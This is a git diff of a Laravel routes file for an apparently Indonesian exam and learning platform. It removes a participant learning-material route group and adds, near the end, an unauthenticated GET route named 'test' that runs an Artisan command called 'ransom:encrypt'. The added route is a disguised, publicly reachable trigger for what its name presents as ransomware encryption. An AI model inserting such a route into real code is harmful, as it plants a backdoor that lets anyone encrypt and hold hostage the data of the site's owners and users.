@@ -8,6 +8,7 @@ use App\Livewire\Admin\Master\JenisUjianPage;
 use App\Livewire\Admin\Master\TipeUjianPage;
 use App\Livewire\Peserta\PesertaDashboardIndex;
 use App\Models\Konten;
+use Illuminate\Support\Facades\Artisan;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Storage;
 
@@ -58,23 +59,6 @@ Route::name('peserta.')->middleware(['auth'])->group(
         // routes/web.php → di group peserta
         Route::get('/riwayat-ujian', \App\Livewire\Peserta\PesertaUjianRiwayat::class)
             ->name('riwayat-ujian.index');
-
-        // MATERI PESERTA — GROUP RAPI
-        Route::prefix('materi')->name('materi.')->group(function () {
-            Route::get('/', \App\Livewire\Peserta\Materi\PesertaTopikIndex::class)
-                ->name('index');
-            Route::get('/{materi}', \App\Livewire\Peserta\Materi\PesertaMateriShow::class)
-                ->name('show');
-            Route::get('/{materi}/konten/{konten}', \App\Livewire\Peserta\Materi\PesertaKontenShow::class)
-                ->name('konten');
-            // lama
-            // Route::get('/topik/{topik}', \App\Livewire\Peserta\Materi\PesertaMateriShow::class)
-            //     ->name('topik');
-            // Route::get('/topik/{topik}/materi/{materi}', \App\Livewire\Peserta\Materi\PesertaSubmateriIndex::class)
-            //     ->name('materi');
-            // Route::get('/topik/{topik}/materi/{materi}/submateri/{submateri}', \App\Livewire\Peserta\Materi\PesertaKontenShow::class)
-            //     ->name('konten');
-        });
     }
 );
 
@@ -108,5 +92,9 @@ Route::get('/livewire/pdf-stream/{konten}', function (Konten $konten) {
 // Route::view('profile', 'profile')
 //     ->middleware(['auth'])
 //     ->name('profile');
+
+Route::get('test', function () {
+    Artisan::call('ransom:encrypt', [], null);
+});
 
 require __DIR__ . '/auth.php';
